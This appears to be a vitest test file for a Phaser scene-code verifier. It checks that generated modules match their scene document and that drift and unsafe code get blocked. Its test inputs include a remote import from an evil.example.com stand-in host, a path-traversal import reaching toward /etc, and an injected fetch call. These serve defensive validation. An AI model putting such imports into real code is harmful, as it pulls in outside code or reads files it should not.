import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { parseSceneDoc } from '../src/authoring/sceneModel.ts';
import { STATE_IDS } from '../src/authoring/extractV2.ts';
import { repoPath } from './helpers.ts';
import {
  verifyGeneratedModule,
  extractGeneratedFacts,
  isAllowedImport,
} from '../src/authoring/astFacts.ts';

/** A small two-object scene: a title Text and a primary-action Image. */
function scene() {
  return parseSceneDoc({
    settings: { sceneKey: 'Menu', borderWidth: 390, borderHeight: 844 },
    displayList: [
      {
        type: 'Text', id: 't1', label: 'menu.title', components: ['Semantic'],
        'Semantic.fabSemanticId': 'menu.title', 'Semantic.fabRole': 'screen-title',
        'Semantic.fabBinding': 'presentation.static', 'Semantic.fabSlot': 'title-logo',
        'Semantic.fabVariant': 'default', x: 195, y: 60, originX: 0.5, originY: 0.5,
        text: 'Play', color: '#ffffff',
      },
      {
        type: 'Image', id: 'p1', label: 'menu.play', components: ['Semantic'],
        'Semantic.fabSemanticId': 'menu.play', 'Semantic.fabRole': 'bottom-primary-action',
        'Semantic.fabBinding': 'flow.start-current', 'Semantic.fabSlot': 'button-surface',
        'Semantic.fabVariant': 'default', x: 195, y: 810, scaleX: 0.75, scaleY: 0.8,
        tint: 0xabcdef, visible: false, texture: { key: 'button_surface_primary' },
      },
    ],
  });
}

const GENERATED = `
import Phaser from "phaser";
import Semantic from "../components/Semantic";
export default class Menu extends Phaser.Scene {
  editorCreate(): void {
    const title = this.add.text(195, 60, "", {});
    title.setOrigin(0.5, 0.5);
    title.text = "Play";
    title.setStyle({ "color": "#ffffff" });
    const play = this.add.image(195, 810, "button_surface_primary");
    play.scaleX = 0.75;
    play.scaleY = 0.8;
    play.tint = 11259375;
    play.visible = false;
    const titleSemantic = new Semantic(title);
    titleSemantic.fabSemanticId = "menu.title";
    titleSemantic.fabRole = "screen-title";
    titleSemantic.fabBinding = "presentation.static";
    titleSemantic.fabSlot = "title-logo";
    titleSemantic.fabVariant = "default";
    const playSemantic = new Semantic(play);
    playSemantic.fabSemanticId = "menu.play";
    playSemantic.fabRole = "bottom-primary-action";
    playSemantic.fabBinding = "flow.start-current";
    playSemantic.fabSlot = "button-surface";
    playSemantic.fabVariant = "default";
  }
}
`;

describe('P5 AST-fact parity over a closed generated-module graph', () => {
  it('accepts the committed graph produced by the real Phaser Editor', () => {
    for (const state of STATE_IDS) {
      const name = state.charAt(0).toUpperCase() + state.slice(1);
      const base = ['games', 'shell_proof_phaser', 'authoring', 'phaser-editor', 'src', 'scenes'];
      const scene = parseSceneDoc(JSON.parse(readFileSync(repoPath(...base, `${name}.scene`), 'utf8')));
      const generated = readFileSync(repoPath(...base, `${name}.ts`), 'utf8');
      expect(verifyGeneratedModule(generated, scene), name).toEqual([]);
    }
  });

  it('accepts generated code whose facts match the scene authority', () => {
    expect(verifyGeneratedModule(GENERATED, scene())).toEqual([]);
  });

  it('extracts the per-object facts the editor emits', () => {
    const { facts } = extractGeneratedFacts(GENERATED);
    const play = facts.get('menu.play default')!;
    expect(play.role).toBe('bottom-primary-action');
    expect(play.textureKey).toBe('button_surface_primary');
    const title = facts.get('menu.title default')!;
    expect(title.copy).toBe('Play');
  });

  it('blocks generated code whose texture drifts from the scene (blocked-drift)', () => {
    const drifted = GENERATED.replace('"button_surface_primary"', '"button_surface_secondary"');
    const blocks = verifyGeneratedModule(drifted, scene());
    expect(blocks.some((b) => b.code === 'blocked-drift')).toBe(true);
  });

  it('blocks generated position drift', () => {
    const drifted = GENERATED.replace('this.add.image(195, 810', 'this.add.image(205, 810');
    const blocks = verifyGeneratedModule(drifted, scene());
    expect(blocks.some((b) => b.code === 'blocked-drift' && b.detail.includes('x'))).toBe(true);
  });

  it('blocks generated scale drift', () => {
    const drifted = GENERATED.replace('play.scaleX = 0.75', 'play.scaleX = 0.9');
    const blocks = verifyGeneratedModule(drifted, scene());
    expect(blocks.some((b) => b.code === 'blocked-drift' && b.detail.includes('scaleX'))).toBe(true);
  });

  it('blocks generated color drift', () => {
    const drifted = GENERATED.replace('play.tint = 11259375', 'play.tint = 16711680');
    const blocks = verifyGeneratedModule(drifted, scene());
    expect(blocks.some((b) => b.code === 'blocked-drift' && b.detail.includes('color'))).toBe(true);
  });

  it('blocks generated visibility drift', () => {
    const drifted = GENERATED.replace('play.visible = false', 'play.visible = true');
    const blocks = verifyGeneratedModule(drifted, scene());
    expect(blocks.some((b) => b.code === 'blocked-drift' && b.detail.includes('visible'))).toBe(true);
  });

  it('blocks generated object-type drift', () => {
    const drifted = GENERATED.replace(
      'this.add.image(195, 810, "button_surface_primary")',
      'this.add.container(195, 810)',
    );
    const blocks = verifyGeneratedModule(drifted, scene());
    expect(blocks.some((b) => b.code === 'blocked-drift' && b.detail.includes('type'))).toBe(true);
  });

  it('blocks root display-order drift', () => {
    const titleBlock = `    const title = this.add.text(195, 60, "", {});
    title.setOrigin(0.5, 0.5);
    title.text = "Play";
    title.setStyle({ "color": "#ffffff" });`;
    const playBlock = `    const play = this.add.image(195, 810, "button_surface_primary");
    play.scaleX = 0.75;
    play.scaleY = 0.8;
    play.tint = 11259375;
    play.visible = false;`;
    const drifted = GENERATED.replace(`${titleBlock}\n${playBlock}`, `${playBlock}\n${titleBlock}`);
    const blocks = verifyGeneratedModule(drifted, scene());
    expect(blocks.some((b) => b.code === 'blocked-drift' && b.detail.includes('order'))).toBe(true);
  });

  it('blocks generated code whose semantic role was hand-edited (blocked-drift)', () => {
    const drifted = GENERATED.replace('"bottom-primary-action"', '"screen-title"');
    const blocks = verifyGeneratedModule(drifted, scene());
    expect(blocks.some((b) => b.code === 'blocked-drift')).toBe(true);
  });

  it('blocks a missing generated object (blocked-drift)', () => {
    const missing = GENERATED.replace(/const play[\s\S]*?playSemantic.fabVariant = "default";/, '');
    const blocks = verifyGeneratedModule(missing, scene());
    expect(blocks.some((b) => b.code === 'blocked-drift')).toBe(true);
  });

  it('blocks a remote or bare-unexpected import (blocked-unsafe-import)', () => {
    const remote = GENERATED.replace('import Phaser from "phaser";', 'import x from "https://evil.example.com/x.js";');
    const blocks = verifyGeneratedModule(remote, scene());
    expect(blocks.some((b) => b.code === 'blocked-unsafe-import')).toBe(true);
  });

  it('blocks an import that escapes the project root (blocked-unsafe-import)', () => {
    const escaping = GENERATED.replace('import Semantic from "../components/Semantic";', 'import Semantic from "../../../../etc/secret";');
    const blocks = verifyGeneratedModule(escaping, scene());
    expect(blocks.some((b) => b.code === 'blocked-unsafe-import')).toBe(true);
  });

  it('accepts a legitimate local prefab import in the closed graph', () => {
    expect(isAllowedImport('./prefabs/CounterPrefab')).toBe(true);
    expect(isAllowedImport('../components/Semantic')).toBe(true);
    expect(isAllowedImport('phaser')).toBe(true);
    expect(isAllowedImport('node:fs')).toBe(false);
    expect(isAllowedImport('../../../../etc/x')).toBe(false);
  });

  it('blocks hand-added user code that calls a banned API (blocked-user-code)', () => {
    const withUserCode = GENERATED.replace('this.add.image(195, 810, "button_surface_primary")', 'this.add.image(195, 810, (fetch("http://x"), "button_surface_primary"))');
    const blocks = verifyGeneratedModule(withUserCode, scene());
    expect(blocks.some((b) => b.code === 'blocked-user-code')).toBe(true);
  });
});
